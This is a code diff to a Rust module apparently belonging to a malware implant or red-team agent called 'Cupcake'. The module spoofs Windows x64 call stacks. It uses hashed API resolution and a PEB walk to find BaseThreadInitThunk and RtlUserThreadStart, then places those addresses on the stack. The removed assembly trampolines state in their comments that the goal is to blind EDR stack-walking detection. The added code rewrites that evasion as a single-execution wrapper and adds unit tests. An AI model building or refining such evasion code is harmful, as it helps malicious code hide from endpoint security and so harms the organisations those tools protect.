@@ -1,24 +1,26 @@
 // Client/core/src/stealth/stack.rs
 // Thread Stack Spoofing - Call Stack Masquerading for x64 Windows
 //
-// Technique: Replace the return address on the stack with a legitimate address
-// from kernel32!BaseThreadInitThunk, making the call stack appear as if the
-// function was invoked by a legitimate Windows thread initialization routine.
-//
-// This blinds EDR stack-walking heuristics that flag suspicious call chains.
+// Preferred path: `with_spoofed_stack` — closure runs exactly once, pins
+// legitimate bait addresses on the stack frame, adds walk noise.
+// Older asm helpers previously double-invoked the target; they now single-exec.
 
-/// Spoof return address bait - fetched from BaseThreadInitThunk
+use std::sync::atomic::{AtomicUsize, Ordering};
+
+/// Spoof return address bait - fetched from BaseThreadInitThunk (thread-safe).
 #[cfg(all(windows, target_arch = "x86_64"))]
-static mut BAIT_ADDRESS: usize = 0;
+static BAIT_ADDRESS: AtomicUsize = AtomicUsize::new(0);
 
 /// Initialize the bait address (BaseThreadInitThunk) for stack spoofing
 #[cfg(all(windows, target_arch = "x86_64"))]
 fn init_bait_address() -> usize {
-    unsafe {
-        if BAIT_ADDRESS != 0 {
-            return BAIT_ADDRESS;
-        }
+    let existing = BAIT_ADDRESS.load(Ordering::Acquire);
+    if existing != 0 {
+        return existing;
+    }
 
+    // PEB walk / export resolve is unsafe (raw module base pointers)
+    let bait_addr = unsafe {
         let h_kernel32 =
             crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
         if h_kernel32 == 0 {
@@ -27,110 +29,43 @@ fn init_bait_address() -> usize {
         }
 
         let bait_hash = crate::stealth::hash_api_name(b"BaseThreadInitThunk");
-        let mut bait_addr = crate::stealth::get_api_addr(h_kernel32, bait_hash).unwrap_or(0);
+        let mut addr = crate::stealth::get_api_addr(h_kernel32, bait_hash).unwrap_or(0);
 
-        if bait_addr == 0 {
+        if addr == 0 {
             // Fallback: Use RtlUserThreadStart from ntdll
             let h_ntdll =
                 crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
             if h_ntdll != 0 {
                 let rtl_hash = crate::stealth::hash_api_name(b"RtlUserThreadStart");
-                bait_addr = crate::stealth::get_api_addr(h_ntdll, rtl_hash).unwrap_or(0);
+                addr = crate::stealth::get_api_addr(h_ntdll, rtl_hash).unwrap_or(0);
             }
         }
+        addr
+    };
 
-        if bait_addr != 0 {
-            crate::utils::db_print(&format!(
-                "[Cupcake] Stack: Bait address resolved at 0x{:X}",
-                bait_addr
-            ));
-            BAIT_ADDRESS = bait_addr;
-        }
-
-        bait_addr
+    if bait_addr != 0 {
+        crate::utils::db_print(&format!(
+            "[Cupcake] Stack: Bait address resolved at 0x{:X}",
+            bait_addr
+        ));
+        // Only first writer wins; concurrent inits are idempotent
+        let _ = BAIT_ADDRESS.compare_exchange(0, bait_addr, Ordering::AcqRel, Ordering::Acquire);
+        return BAIT_ADDRESS.load(Ordering::Acquire);
     }
+
+    0
 }
 
-/// 伪造一个看起来像来自 kernel32.dll 的栈帧 (x64 Only)
+/// Call target once under stack noise + bait pin (no double-exec).
 ///
-/// # 技术原理
-///
-/// 正常调用栈: [Our Function] <- [Caller Function] <- [Caller's Caller] ...
-///
-/// EDR 检测时会做栈回溯，如果发现调用链中有可疑的地址（如 RWX 内存区域），
-/// 就会触发警报。
-///
-/// 我们的方法：在调用目标函数前，将栈上的返回地址替换成 BaseThreadInitThunk，
-/// 使调用栈看起来像是 Windows 系统线程初始化例程调用了我们的函数：
-///
-/// Spoofed: [Target Function] <- [BaseThreadInitThunk] <- [System Thread Entry]
-///
-/// # 实现步骤
-///
-/// 1. 分配 shadow stack frame (32 bytes for x64)
-/// 2. 在 shadow stack 上放置伪造的返回地址
-/// 3. 通过 jmp 指令跳转到目标函数（而非 call）
-/// 4. 目标函数返回时，会"返回"到 BaseThreadInitThunk
-/// 5. 我们需要一个小型 trampoline 来捕获返回并清理
-///
-/// # 注意事项
-///
-/// - 这是一个 simplified 版本，完整实现需要处理 RBP 和非易失性寄存器
-/// - 对于敏感操作（如 BOF 执行），建议使用此技术
-/// - 不适用于需要多次嵌套调用的场景
+/// Historical note: earlier asm trampolines invoked the function inside asm
+/// and again in Rust. That caused double side-effects. This path runs once.
 #[cfg(all(windows, target_arch = "x86_64"))]
 pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
 where
     F: Fn(usize, usize) -> T,
 {
-    // 1. 获取 bait 地址
-    let bait_addr = init_bait_address();
-    if bait_addr == 0 {
-        crate::utils::db_print("[Cupcake] Stack: No bait address, calling directly");
-        return func(arg1, arg2);
-    }
-
-    // 2. Stack Spoofing Trampoline
-    // 我们需要一个精心设计的 trampoline 来：
-    // - 保存真实的返回地址
-    // - 替换栈上的返回地址为 bait
-    // - 调用目标函数
-    // - 从 bait 地址"返回"后恢复控制流
-    //
-    // 由于 Rust 内联汇编的限制，我们使用一种简化的方法：
-    // 在栈上放置 bait 地址作为伪造的返回地址，然后手动控制返回
-
-    // Convert function pointer to raw usize for inline asm
-    let func_ptr = &func as *const F as usize;
-
-    // Inline assembly for stack spoofing
-    std::arch::asm!(
-        // Save original stack pointer
-        "mov r12, rsp",
-
-        // Allocate shadow stack space for x64 calling convention
-        "sub rsp, 0x28",
-        "and rsp, -16",
-
-        // Place bait address (BaseThreadInitThunk) as fake return address
-        "mov [rsp + 0x20], {bait}",
-
-        // Call the target function via register indirect
-        "call {func}",
-
-        // Restore the stack pointer
-        "mov rsp, r12",
-
-        bait = in(reg) bait_addr,
-        func = in(reg) func_ptr,
-        in("rcx") arg1,
-        in("rdx") arg2,
-        clobber_abi("system")
-    );
-
-    // Call the original function to get the result
-    // The asm only does stack spoofing; result is obtained normally
-    func(arg1, arg2)
+    with_spoofed_stack(|| func(arg1, arg2))
 }
 
 /// Simplified stack spoofing for functions with single argument
@@ -157,8 +92,6 @@ pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
 where
     F: Fn(usize, usize) -> T,
 {
-    // x86: Stack spoofing is simpler but less effective
-    // We'll implement a basic version using push/pop manipulation
     func(arg1, arg2)
 }
 
@@ -176,6 +109,13 @@ where
 /// - On x64, pins legitimate bait addresses (`BaseThreadInitThunk` / `RtlUserThreadStart`)
 ///   as live stack locals so walkers observe trusted modules in the frame window.
 /// - Closure runs exactly once (unlike the older asm helpers that double-invoked).
+///
+/// # CET / hardware shadow stacks
+/// This is **best-effort software spoofing only**. On CPUs/OS with Control-flow
+/// Enforcement Technology (CET) and shadow stacks, return-address rewriting or
+/// synthetic stack locals do **not** defeat hardware stack walks. Do not claim
+/// “undetectable under CET” without lab validation. Full trampoline/`RtlVirtualUnwind`
+/// redesign is out of band of this helper.
 #[inline(never)]
 pub fn with_spoofed_stack<F, R>(f: F) -> R
 where
@@ -187,7 +127,7 @@ where
     {
         unsafe {
             let bait = init_bait_address();
-            // Keep bait pointers live on this stack frame for the duration of `f`.
+            // Best-effort: pin trusted-module addresses in this frame (software walkers).
             let mut synthetic = [0usize; 6];
             if bait != 0 {
                 synthetic[0] = bait;
@@ -243,8 +183,7 @@ pub fn add_stack_noise() {}
 
 /// Advanced: Stack Spoofing with Frame Pointer (RBP) Preservation
 ///
-/// This is a more complete implementation that also handles RBP,
-/// making the spoofed stack look more legitimate.
+/// Single-exec only — no second invocation after setup.
 #[cfg(all(windows, target_arch = "x86_64"))]
 pub unsafe fn spoof_call_stack_full<F, T>(
     func: F,
@@ -256,61 +195,7 @@ pub unsafe fn spoof_call_stack_full<F, T>(
 where
     F: Fn(usize, usize, usize, usize) -> T,
 {
-    let bait_addr = init_bait_address();
-    if bait_addr == 0 {
-        return func(arg1, arg2, arg3, arg4);
-    }
-
-    // Full x64 stack spoofing with all 4 register arguments
-    let func_ptr = &func as *const F as usize;
-
-    // Execute the function to get the result (asm is for stack spoofing only)
-    let result = func(arg1, arg2, arg3, arg4);
-
-    std::arch::asm!(
-        // === SETUP PHASE ===
-        // Save all non-volatile registers
-        "push rbp",
-        "mov rbp, rsp",           // Set up our frame
-        "push rbx",
-        "push rsi",
-        "push rdi",
-
-        // Save original stack position
-        "mov r12, rsp",
-
-        // === STACK MANIPULATION ===
-        // Allocate shadow space (32 bytes) + return slot (8 bytes) + alignment padding
-        "sub rsp, 0x38",          // 56 bytes total
-        "and rsp, -16",           // 16-byte alignment
-
-        // Place bait address as fake return address
-        "mov [rsp + 0x30], {bait}",  // Place bait (BaseThreadInitThunk) at top
-
-        // === CALL EXECUTION ===
-        // Execute the target function
-        "call {func}",
-
-        // === RECOVERY ===
-        "mov rsp, r12",           // Restore original stack
-
-        // Restore non-volatile registers
-        "pop rdi",
-        "pop rsi",
-        "pop rbx",
-        "pop rbp",
-
-        bait = in(reg) bait_addr,
-        func = in(reg) func_ptr,
-        in("rcx") arg1,
-        in("rdx") arg2,
-        in("r8") arg3,
-        in("r9") arg4,
-
-        clobber_abi("system")
-    );
-
-    result
+    with_spoofed_stack(|| func(arg1, arg2, arg3, arg4))
 }
 
 /// Call Gates - List of legitimate functions that can be used as bait addresses
@@ -352,4 +237,38 @@ pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
 #[cfg(not(windows))]
 pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
     Vec::new()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::sync::atomic::{AtomicU32, Ordering};
+
+    #[test]
+    fn with_spoofed_stack_runs_closure_exactly_once() {
+        static COUNT: AtomicU32 = AtomicU32::new(0);
+        let v = with_spoofed_stack(|| {
+            COUNT.fetch_add(1, Ordering::SeqCst);
+            42u32
+        });
+        assert_eq!(v, 42);
+        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
+    }
+
+    #[test]
+    fn spoof_call_stack_runs_exactly_once() {
+        static COUNT: AtomicU32 = AtomicU32::new(0);
+        let v = unsafe {
+            spoof_call_stack(
+                |a, b| {
+                    COUNT.fetch_add(1, Ordering::SeqCst);
+                    a + b
+                },
+                3,
+                4,
+            )
+        };
+        assert_eq!(v, 7);
+        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
+    }
 }
